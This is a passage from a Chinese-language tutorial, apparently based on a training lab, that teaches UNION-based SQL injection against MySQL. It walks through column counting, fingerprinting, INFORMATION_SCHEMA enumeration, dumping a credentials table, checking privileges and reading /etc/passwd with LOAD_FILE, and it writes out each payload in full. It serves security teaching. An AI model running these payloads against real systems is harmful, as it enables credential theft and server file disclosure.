class=\"line\">mysql&gt; SELECT city FROM ports UNION SELECT * FROM ships;</span><br><span class=\"line\"></span><br><span class=\"line\">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure>\n\n<p>上面的查询导致错误，因为第一个<code>SELECT</code>返回一列而第二个<code>SELECT</code>返回两列。一旦我们有两个返回相同列数的查询，我们就可以使用<code>UNION</code>运算符从其他表和数据库中提取数据。</p>\n<p>例如，如果查询是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> products <span class=\"keyword\">WHERE</span> product_id <span class=\"operator\">=</span> <span class=\"string\">&#x27;user_input&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们可以<code>UNION</code>在输入中注入一个查询，以便返回另一个表中的行：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> products <span class=\"keyword\">where</span> product_id <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">UNION</span> <span class=\"keyword\">SELECT</span> username, password <span class=\"keyword\">from</span> passwords<span class=\"comment\">-- &#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>假设表有两列，上述查询将返回<code>username</code>表<code>password</code>中的条目。<code>passwords``products</code></p>\n<hr>\n<h3 id=\"非偶数列\"><a href=\"#非偶数列\" class=\"headerlink\" title=\"非偶数列\"></a>非偶数列</h3><p>我们会发现原始查询的列数通常与我们要执行的 SQL 查询的列数不同，因此我们必须解决这个问题。例如，假设我们只有一列。在这种情况下，我们希望<code>SELECT</code>，我们可以为剩余的必需列放置垃圾数据，以便我们正在处理的列总数<code>UNION</code>与原始查询相同。</p>\n<p>例如，我们可以使用任何字符串作为垃圾数据，查询将返回该字符串作为该列的输出。如果我们<code>UNION</code>使用字符串<code>&quot;junk&quot;</code>，<code>SELECT</code>则查询<code>SELECT &quot;junk&quot; from passwords</code>将始终返回<code>junk</code>。我们也可以使用数字。例如，查询<code>SELECT 1 from passwords</code>将始终<code>1</code>作为输出返回。</p>\n<p>注意：在用垃圾数据填充其他列时，必须保证数据类型与该列的数据类型匹配，否则查询会返回错误。为了简单起见，我们将使用数字作为我们的垃圾数据，这对于跟踪我们的有效载荷位置也很方便，我们将在后面讨论。</p>\n<p>提示：对于高级 SQL 注入，我们可能只想使用 ‘NULL’ 来填充其他列，因为 ‘NULL’ 适合所有数据类型。</p>\n<p><code>products</code>上面例子中的表有两列，所以我们必须有<code>UNION</code>两列。如果我们只想得到一列“eg <code>username</code>”，我们必须这样做<code>username, 2</code>，这样我们就有相同数量的列：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> products <span class=\"keyword\">where</span> product_id <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">UNION</span> <span class=\"keyword\">SELECT</span> username, <span class=\"number\">2</span> <span class=\"keyword\">from</span> passwords</span><br></pre></td></tr></table></figure>\n\n<p>如果我们在原始查询的表中有更多的列，我们必须添加更多的数字来创建剩余的所需列。例如，如果原始查询用于<code>SELECT</code>具有四列的表，我们的<code>UNION</code>注入将是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UNION</span> <span class=\"keyword\">SELECT</span> username, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span> <span class=\"keyword\">from</span> passwords<span class=\"comment\">-- &#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>此查询将返回：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- &#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">+-----------+-----------+-----------+-----------+</span><br><span class=\"line\">| product_1 | product_2 | product_3 | product_4 |</span><br><span class=\"line\">+-----------+-----------+-----------+-----------+</span><br><span class=\"line\">|   admin   |    2      |    3      |    4      |</span><br><span class=\"line\">+-----------+-----------+-----------+-----------+</span><br></pre></td></tr></table></figure>\n\n<p>正如我们所见，我们想要的 ‘ <code>UNION SELECT username from passwords</code>‘ 查询输出位于第二行的第一列，而数字填充了其余列。</p>\n<h2 id=\"0x08-Union-Injection\"><a href=\"#0x08-Union-Injection\" class=\"headerlink\" title=\"0x08 Union Injection\"></a>0x08 Union Injection</h2><p>现在我们知道 Union 子句是如何工作的以及如何使用它让我们学习如何在我们的 SQL 注入中使用它。让我们来看下面的例子：</p>\n<p><img src=\"https://p.ipic.vip/5yfxhm.png\" alt=\"img\"></p>\n<p>我们在搜索参数中看到了潜在的 SQL 注入。我们通过注入单引号 ( ) 来应用 SQLi Discovery 步骤<code>&#39;</code>，但我们确实收到错误：</p>\n<p><img src=\"https://p.ipic.vip/pabe77.png\" alt=\"img\"></p>\n<p>由于我们造成了错误，这可能意味着该页面容易受到 SQL 注入攻击。这种情况非常适合通过基于联合的注入进行利用，因为我们可以看到我们的查询结果。</p>\n<hr>\n<h3 id=\"检测列数\"><a href=\"#检测列数\" class=\"headerlink\" title=\"检测列数\"></a>检测列数</h3><p>在继续使用基于联合的查询之前，我们需要找到服务器选择的列数。有两种检测列数的方法：</p>\n<ul>\n<li>使用<code>ORDER BY</code></li>\n<li>使用<code>UNION</code></li>\n</ul>\n<h5 id=\"使用-ORDER-BY\"><a href=\"#使用-ORDER-BY\" class=\"headerlink\" title=\"使用 ORDER BY\"></a>使用 ORDER BY</h5><p>检测列数的第一种方法是通过<code>ORDER BY</code>我们之前讨论过的函数。我们必须注入一个查询，该查询按我们指定的列对结果进行排序，“即第 1 列、第 2 列等等”，直到我们收到一个错误，指出指定的列不存在。</p>\n<p>例如，我们可以从 开始<code>order by 1</code>，按第一列排序，然后成功，因为表必须至少有一个列。然后我们会做<code>order by 2</code>，然后<code>order by 3</code>直到我们到达一个返回错误的数字，或者页面没有显示任何输出，这意味着这个列号不存在。我们成功排序的最终成功列为我们提供了列总数。</p>\n<p>如果我们在 处失败<code>order by 4</code>，这意味着该表有三列，这是我们能够成功排序的列数。让我们回到之前的示例并尝试使用以下有效负载进行相同的操作：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; order by 1-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>提醒：我们在末尾添加了一个额外的破折号 (-)，以向您表明 (–) 之后有一个空格。</p>\n<p>如我们所见，我们得到了一个正常的结果：</p>\n<p><img src=\"https://p.ipic.vip/5yfxhm.png\" alt=\"img\"></p>\n<p>接下来，让我们尝试使用以下有效负载按第二列排序：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; order by 2-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>我们仍然得到结果。我们注意到它们的排序方式与预期的不同：</p>\n<p><img src=\"https://p.ipic.vip/eo1va8.jpg\" alt=\"img\"></p>\n<p><code>3</code>我们对 column和做同样的事情<code>4</code>并得到结果。但是，当我们尝试<code>ORDER BY</code>第 5 列时，出现以下错误：</p>\n<p><img src=\"https://p.ipic.vip/d109h9.jpg\" alt=\"img\"></p>\n<p>这意味着该表恰好有 4 列。</p>\n<h5 id=\"使用-UNION\"><a href=\"#使用-UNION\" class=\"headerlink\" title=\"使用 UNION\"></a>使用 UNION</h5><p>另一种方法是尝试使用不同数量的列进行联合注入，直到我们成功取回结果。第一个方法总是返回结果，直到我们遇到错误，而这个方法总是给出错误，直到我们获得成功。我们可以从注入一个 3 列<code>UNION</code>查询开始：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,2,3-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>我们收到一条错误消息，指出列数不匹配：  </p>\n<p><img src=\"https://p.ipic.vip/65slq5.png\" alt=\"img\"></p>\n<p>因此，让我们尝试四列并查看响应：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,2,3,4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/sz9ia5.png\" alt=\"img\"></p>\n<p>这次我们成功得到了结果，这意味着该表再次具有 4 列。我们可以使用任何一种方法来确定列数。一旦我们知道了列数，我们就知道如何形成我们的有效载荷，我们可以继续下一步。</p>\n<hr>\n<h3 id=\"注射位置\"><a href=\"#注射位置\" class=\"headerlink\" title=\"注射位置\"></a>注射位置</h3><p>虽然查询可能返回多列，但 Web 应用程序可能只显示其中的一部分。因此，如果我们将查询注入到页面上未打印的列中，我们将无法获得其输出。这就是为什么我们需要确定将哪些列打印到页面，以确定在何处放置我们的注入。在前面的示例中，虽然注入的查询返回 1、2、3 和 4，但我们在页面上只看到 2、3 和 4 作为输出数据返回给我们：</p>\n<p><img src=\"https://p.ipic.vip/sz9ia5.png\" alt=\"img\"></p>\n<p>并非每一列都会显示给用户是很常见的。例如，ID 字段通常用于将不同的表链接在一起，但用户不需要看到它。这告诉我们打印了第 2 列、第 3 列和第 4 列以将我们的注入放置在其中任何一个中。<code>We cannot place our injection at the beginning, or its output will not be printed.</code></p>\n<p>这是使用数字作为我们的垃圾数据的好处，因为它可以很容易地跟踪打印了哪些列，因此我们知道在哪一列放置我们的查询。为了测试我们是否可以从数据库中获取“而不仅仅是数字”的实际数据，我们可以使用<code>@@version</code>SQL 查询作为测试并将其放在第二列而不是数字 2 中：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,@@version,3,4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/egjoic.jpg\" alt=\"img\"></p>\n<p>如我们所见，我们可以获得显示的数据库版本。现在我们知道如何形成我们的 Union SQL 注入有效负载，以成功地获得打印在页面上的查询输出。在下一节中，我们将讨论如何枚举数据库并从其他表和数据库中获取数据。</p>\n<h2 id=\"0x09-数据库枚举\"><a href=\"#0x09-数据库枚举\" class=\"headerlink\" title=\"0x09 数据库枚举\"></a>0x09 数据库枚举</h2><p>在前面的部分中，我们了解了不同的 SQL 查询<code>MySQL</code>和 SQL 注入以及如何使用它们。本节将使用所有这些，并在 SQL 注入中使用 SQL 查询从数据库中收集数据。</p>\n<hr>\n<h3 id=\"MySQL指纹识别\"><a href=\"#MySQL指纹识别\" class=\"headerlink\" title=\"MySQL指纹识别\"></a>MySQL指纹识别</h3><p>在枚举数据库之前，我们通常需要确定我们正在处理的 DBMS 类型。这是因为每个 DBMS 都有不同的查询，知道它是什么将帮助我们知道使用什么查询。</p>\n<p>作为初步猜测，如果我们在 HTTP 响应中看到的 Web 服务器是<code>Apache</code>或<code>Nginx</code>，则可以很好地猜测该 Web 服务器正在 Linux 上运行，因此 DBMS 很可能是<code>MySQL</code>。如果网络服务器是，这同样也适用于 Microsoft DBMS <code>IIS</code>，所以它很可能是<code>MSSQL</code>。然而，这是一个牵强附会的猜测，因为许多其他数据库可以在操作系统或 Web 服务器上使用。因此，我们可以测试不同的查询来识别我们正在处理的数据库类型。</p>\n<p>正如我们<code>MySQL</code>在本模块中介绍的那样，让我们使用指纹<code>MySQL</code>数据库。以下查询及其输出将告诉我们我们正在处理<code>MySQL</code>：</p>\n<table>\n<thead>\n<tr>\n<th>有效载荷</th>\n<th>何时使用</th>\n<th>预期产出</th>\n<th>输出错误</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>SELECT @@version</code></td>\n<td>当我们有完整的查询输出时</td>\n<td>MySQL版本’即<code>10.3.22-MariaDB-1ubuntu1</code>‘</td>\n<td>在 MSSQL 中，它返回 MSSQL 版本。其他 DBMS 出错。</td>\n</tr>\n<tr>\n<td><code>SELECT POW(1,1)</code></td>\n<td>当我们只有数字输出时</td>\n<td><code>1</code></td>\n<td>其他 DBMS 出错</td>\n</tr>\n<tr>\n<td><code>SELECT SLEEP(5)</code></td>\n<td>盲&#x2F;无输出</td>\n<td>延迟页面响应 5 秒并返回<code>0</code>。</td>\n<td>不会延迟与其他 DBMS 的响应</td>\n</tr>\n</tbody></table>\n<p>正如我们在上一节的示例中看到的，当我们尝试时<code>@@version</code>，它给了我们：</p>\n<p><img src=\"https://p.ipic.vip/vejupm.jpg\" alt=\"img\"></p>\n<p>输出<code>10.3.22-MariaDB-1ubuntu1</code>意味着我们正在处理<code>MariaDB</code>类似于 MySQL 的 DBMS。由于我们有直接的查询输出，因此我们不必测试其他有效载荷。相反，我们可以测试它们，看看我们得到了什么。</p>\n<hr>\n<h3 id=\"INFORMATION-SCHEMA-数据库\"><a href=\"#INFORMATION-SCHEMA-数据库\" class=\"headerlink\" title=\"INFORMATION_SCHEMA 数据库\"></a>INFORMATION_SCHEMA 数据库</h3><p>要使用从表中提取数据<code>UNION SELECT</code>，我们需要正确地形成我们的<code>SELECT</code>查询。为此，我们需要以下信息：</p>\n<ul>\n<li>数据库列表</li>\n<li>每个数据库中的表列表</li>\n<li>每个表中的列列表</li>\n</ul>\n<p>有了以上信息，我们就可以形成我们的<code>SELECT</code>语句，从 DBMS 内的任何数据库中的任何表中的任何列中转储数据。这是我们可以使用<code>INFORMATION_SCHEMA</code>数据库的地方。</p>\n<p>INFORMATION_SCHEMA数据库包含有关服务器上存在<a href=\"https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html\">的</a>数据库和表的元数据。该数据库在利用 SQL 注入漏洞时起着至关重要的作用。由于这是一个不同的数据库，我们不能直接用语句调用它的表<code>SELECT</code>。如果我们只为语句指定一个表的名称<code>SELECT</code>，它将在同一数据库中查找表。</p>\n<p>因此，要引用另一个数据库中存在的表，我们可以使用点 ‘ <code>.</code>‘ 运算符。例如，对于名为 的数据库中存在的<code>SELECT</code>表，我们可以使用：<code>users``my_database</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> my_database.users;</span><br></pre></td></tr></table></figure>\n\n<p>同样，我们可以查看<code>INFORMATION_SCHEMA</code>数据库中存在的表。</p>\n<hr>\n<h3 id=\"图式\"><a href=\"#图式\" class=\"headerlink\" title=\"图式\"></a>图式</h3><p>要开始我们的枚举，我们应该找到 DBMS 上可用的数据库。数据库中的表<a href=\"https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html\">SCHEMATA</a><code>INFORMATION_SCHEMA</code>包含有关服务器上所有数据库的信息。它用于获取数据库名称，以便我们可以查询它们。该<code>SCHEMA_NAME</code>列包含当前存在的所有数据库名称。</p>\n<p>让我们先在本地数据库上测试一下，看看查询是如何使用的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;</span><br><span class=\"line\"></span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| SCHEMA_NAME        |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| mysql              |</span><br><span class=\"line\">| information_schema |</span><br><span class=\"line\">| performance_schema |</span><br><span class=\"line\">| ilfreight          |</span><br><span class=\"line\">| dev                |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">6 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>\n\n<p>我们看到了<code>ilfreight</code>和<code>dev</code>数据库。</p>\n<p>注意：前三个数据库是默认的 MySQL 数据库，并且存在于任何服务器上，因此我们通常在数据库枚举时忽略它们。有时还有第四个“系统”数据库。</p>\n<p>现在，让我们使用<code>UNION</code>SQL 注入来执行相同的操作，并使用以下有效负载：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/tsychv.png\" alt=\"img\"></p>\n<p>除了默认数据库之外，我们再次看到两个数据库，<code>ilfreight</code>和。<code>dev</code>让我们找出 Web 应用程序正在运行的数据库以从中检索端口数据。我们可以通过查询找到当前数据库<code>SELECT database()</code>。我们可以像在上一节中查找 DBMS 版本的方式一样执行此操作：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,database(),2,3-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/4zwupa.jpg\" alt=\"img\"></p>\n<p>我们看到数据库名称是<code>ilfreight</code>. 然而，另一个数据库 ( <code>dev</code>) 看起来很有趣。因此，让我们尝试从中检索表格。</p>\n<hr>\n<h3 id=\"桌子\"><a href=\"#桌子\" class=\"headerlink\" title=\"桌子\"></a>桌子</h3><p>在我们从数据库中转储数据之前<code>dev</code>，我们需要获取表的列表以使用<code>SELECT</code>语句查询它们。要查找数据库中的所有表，我们可以使用数据库<code>TABLES</code>中的表<code>INFORMATION_SCHEMA</code>。</p>\n<p><a href=\"https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html\">TABLES</a>表包含有关整个数据库中所有表的信息。该表包含多个列，但我们对<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>列感兴趣。列<code>TABLE_NAME</code>存储表名，而<code>TABLE_SCHEMA</code>列指向每个表所属的数据库。这可以类似于我们找到数据库名称的方式来完成。例如，我们可以使用以下有效负载来查找<code>dev</code>数据库中的表：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#x27;</span>dev<span class=\"string\">&#x27;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>请注意我们如何用“TABLE_NAME”和“TABLE_SCHEMA”替换数字“2”和“3”，以获取同一查询中两列的输出。</p>\n<p><img src=\"https://p.ipic.vip/h240uh.png\" alt=\"img\"></p>\n<p>注意：我们添加了一个 (where table_schema&#x3D;’dev’) 条件来只返回来自 ‘dev’ 数据库的表，否则我们会得到所有数据库中的所有表，这可能有很多。</p>\n<p>我们在 dev 数据库中看到四个表，即<code>credentials</code>、<code>framework</code>、<code>pages</code>和<code>posts</code>。例如，该<code>credentials</code>表可能包含要查看的敏感信息。</p>\n<hr>\n<h3 id=\"列\"><a href=\"#列\" class=\"headerlink\" title=\"列\"></a>列</h3><p>要转储表的数据<code>credentials</code>，首先要找到表中的列名，可以在数据库<code>COLUMNS</code>中的表中找到<code>INFORMATION_SCHEMA</code>。COLUMNS表包含有关所有数据库中存在的所有列的信息<a href=\"https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html\">。</a>这有助于我们找到查询表的列名。、和列可用于实现此目的<code>COLUMN_NAME</code>。正如我们之前所做的那样，让我们尝试使用此有效负载来查找表中的列名：<code>TABLE_NAME``TABLE_SCHEMA``credentials</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#x27;</span>credentials<span class=\"string\">&#x27;-- -  </span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/i7lof8.jpg\" alt=\"img\"></p>\n<p>该表有两列，名为<code>username</code>和<code>password</code>。我们可以使用此信息并从表中转储数据。</p>\n<hr>\n<h3 id=\"数据\"><a href=\"#数据\" class=\"headerlink\" title=\"数据\"></a>数据</h3><p>现在我们有了所有的信息，我们可以形成我们的查询来从数据库中的表中<code>UNION</code>转储<code>username</code>和<code>password</code>列的数据。我们可以用and代替第 2 列和第 3 列：<code>credentials``dev``username``password</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1, username, password, 4 from dev.credentials-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>请记住：不要忘记使用点运算符来引用“开发”数据库中的“凭据”，因为我们在“ilfreight”数据库中运行，如前所述。</p>\n<p><img src=\"https://p.ipic.vip/n9oypj.png\" alt=\"img\"></p>\n<p>我们能够获取<code>credentials</code>表中的所有条目，其中包含密码哈希和 API 密钥等敏感信息。</p>\n<h2 id=\"0x10-读取文件\"><a href=\"#0x10-读取文件\" class=\"headerlink\" title=\"0x10 读取文件\"></a>0x10 读取文件</h2><p>除了从 DBMS 中的各种表和数据库中收集数据外，SQL 注入还可以用于执行许多其他操作，例如在服务器上读取和写入文件，甚至在后端服务器上获得远程代码执行。</p>\n<hr>\n<h3 id=\"特权\"><a href=\"#特权\" class=\"headerlink\" title=\"特权\"></a>特权</h3><p>读取数据比写入数据更为常见，在现代 DBMS 中，写入数据严格保留给特权用户使用，因为它会导致系统利用，正如我们将看到的那样。例如，在 中<code>MySQL</code>，DB 用户必须有权<code>FILE</code>将文件的内容加载到表中，然后从该表中转储数据并读取文件。因此，让我们从收集有关我们在数据库中的用户权限的数据开始，以决定我们是否将文件读取和&#x2F;或写入后端服务器。</p>\n<h5 id=\"数据库用户\"><a href=\"#数据库用户\" class=\"headerlink\" title=\"数据库用户\"></a>数据库用户</h5><p>首先，我们必须确定我们在数据库中是哪个用户。虽然我们不一定需要数据库管理员 (DBA) 权限来读取数据，但在现代 DBMS 中这变得越来越需要，因为只有 DBA 才被授予此类权限。这同样适用于其他常见的数据库。如果我们确实拥有 DBA 权限，那么我们更有可能拥有文件读取权限。如果我们不这样做，那么我们必须检查我们的特权，看看我们能做什么。为了能够找到我们当前的数据库用户，我们可以使用以下任何查询：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">USER</span>()</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"built_in\">CURRENT_USER</span>()</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">user</span> <span class=\"keyword\">from</span> mysql.user</span><br></pre></td></tr></table></figure>\n\n<p>我们的<code>UNION</code>注入有效载荷如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, user(), 3, 4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>或者：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, user, 3, 4 from mysql.user-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>这告诉我们我们当前的用户，在这种情况下是<code>root</code>：</p>\n<p><img src=\"https://p.ipic.vip/mt3xp0.jpg\" alt=\"img\"></p>\n<p>这是非常有前途的，因为根用户很可能是 DBA，这给了我们很多特权。</p>\n<h5 id=\"用户权限\"><a href=\"#用户权限\" class=\"headerlink\" title=\"用户权限\"></a>用户权限</h5><p>现在我们知道了我们的用户，我们可以开始寻找我们对那个用户有什么特权。首先，我们可以通过以下查询来测试我们是否拥有超级管理员权限：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> super_priv <span class=\"keyword\">FROM</span> mysql.user</span><br></pre></td></tr></table></figure>\n\n<p>再一次，我们可以在上述查询中使用以下有效负载：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>如果我们在 DBMS 中有很多用户，我们可以添加<code>WHERE user=&quot;root&quot;</code>只显示当前用户的权限<code>root</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -  </span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/d6y0ff.jpg\" alt=\"img\"></p>\n<p>查询返回<code>Y</code>，这意味着<code>YES</code>，表示超级用户权限。我们还可以使用以下查询直接从模式中转储我们拥有的其他特权：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>再一次，我们可以添加<code>WHERE user=&quot;root&quot;</code>以仅显示我们当前的用户<code>root</code>权限。我们的有效载荷将是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>我们看到了所有可能赋予我们当前用户的权限：</p>\n<p><img src=\"https://p.ipic.vip/yv5vct.jpg\" alt=\"img\"></p>\n<p>我们看到<code>FILE</code>为我们的用户列出了权限，使我们能够读取文件甚至可能写入文件。因此，我们可以继续尝试读取文件。</p>\n<hr>\n<h3 id=\"加载文件\"><a href=\"#加载文件\" class=\"headerlink\" title=\"加载文件\"></a>加载文件</h3><p>现在我们知道我们有足够的权限来读取本地系统文件，让我们使用函数来做到这一点<code>LOAD_FILE()</code>。LOAD_FILE <a href=\"https://mariadb.com/kb/en/load_file/\">()</a>函数可用于 MariaDB &#x2F; MySQL 从文件中读取数据。该函数只接受一个参数，即文件名。以下查询是如何读取文件的示例<code>/etc/passwd</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> LOAD_FILE(<span class=\"string\">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>注意：如果运行 MySQL 的 OS 用户有足够的权限读取文件，我们将只能读取该文件。</p>\n<p>类似于我们一直使用<code>UNION</code>注入的方式，我们可以使用上面的查询：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/pukwyf.png\" alt=\"img\"></p>\n<p>我们能够通过SQL注入成功读取到passwd文件的内容。不幸的是，这也可能被用来泄露应用程序源代码。</p>\n<hr>\n<h3 id=\"另一个例子-1\"><a href=\"#另一个例子-1\" class=\"headerlink\" title=\"另一个例子\"></a>另一个例子</h3><p>我们知道当前页面是<code>search.php</code>。默认的 Apache webroot 是<code>/var/www/html</code>. 让我们尝试阅读文件的源代码<code>/var/www/html/search.php</code>。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4-- 